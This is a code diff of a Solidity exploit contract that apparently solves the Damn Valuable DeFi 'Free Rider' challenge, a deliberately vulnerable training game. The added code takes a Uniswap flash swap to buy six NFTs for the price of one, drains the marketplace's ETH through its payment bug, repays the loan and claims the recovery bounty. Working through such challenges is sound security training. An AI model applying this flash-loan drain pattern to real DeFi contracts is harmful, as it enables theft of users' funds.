@@ -2,6 +2,7 @@
 
 pragma solidity ^0.8.0;
 
+import "./FreeRiderRecovery.sol";
 import "./FreeRiderNFTMarketplace.sol";
 import "../DamnValuableToken.sol";
 import "../DamnValuableNFT.sol";
@@ -20,6 +21,7 @@ contract AttackFreeRider {
     IUniswapV2Pair public immutable pair;
     IUniswapV2Factory public immutable factory;
     FreeRiderNFTMarketplace public immutable marketplace;
+    FreeRiderRecovery public immutable recovery;
     uint256 public constant wethLoanAmount = 15 ether;
     uint256[] tokenIds = [0, 1, 2, 3, 4, 5];
 
@@ -29,7 +31,8 @@ contract AttackFreeRider {
         WETH _weth,
         IUniswapV2Factory _factory,
         IUniswapV2Pair _pair,
-        FreeRiderNFTMarketplace _marketplace
+        FreeRiderNFTMarketplace _marketplace,
+        FreeRiderRecovery _recovery
     ) payable {
         attacker = payable(msg.sender);
         dvt = _dvt;
@@ -38,9 +41,27 @@ contract AttackFreeRider {
         pair = _pair;
         factory = _factory;
         marketplace = _marketplace;
+        recovery = _recovery;
     }
 
-    function attack() external payable {}
+    function attack() external payable {
+        // Get the extra eth and pays for the NFTs
+        _flashSwap();
+        // Transfers the NFTs to recovery contract and claims the bounty
+        _claimBounty();
+    }
+
+    function _claimBounty() internal {
+        // Transfer NFTs to recovery and claim bounty
+        for (uint8 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(
+                address(this),
+                address(recovery),
+                i,
+                abi.encode(attacker)
+            );
+        }
+    }
 
     function _flashSwap() internal {
         // Make a flash swap from UniswapV2Pair
@@ -56,16 +77,11 @@ contract AttackFreeRider {
         );
     }
 
-    function uniswapV2Call(
-        address sender,
-        uint256 wethAmount,
-        uint256 dvtAmount,
-        bytes calldata data
-    ) external {
+    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
         // This is the callback function that will be executed from Uniswap
 
         // Withdraw 15WETH to ETH because marketplace receives ETH.
-        weth.withdraw(wethAmount);
+        weth.withdraw(wethLoanAmount);
 
         // Purchase all NFTS for the price of 1 (15 ETH)
         // This will also give us 90 extra ETH
@@ -82,8 +98,16 @@ contract AttackFreeRider {
 
         // Pay back the loan + fee to pair
         weth.transfer(address(pair), amountToRepay);
+    }
 
-        // Still need to transfer all the nfts to claim rewards from recovery contract.
+    // Interface required to receive NFT as a Smart Contract
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
     }
 
     receive() external payable {}
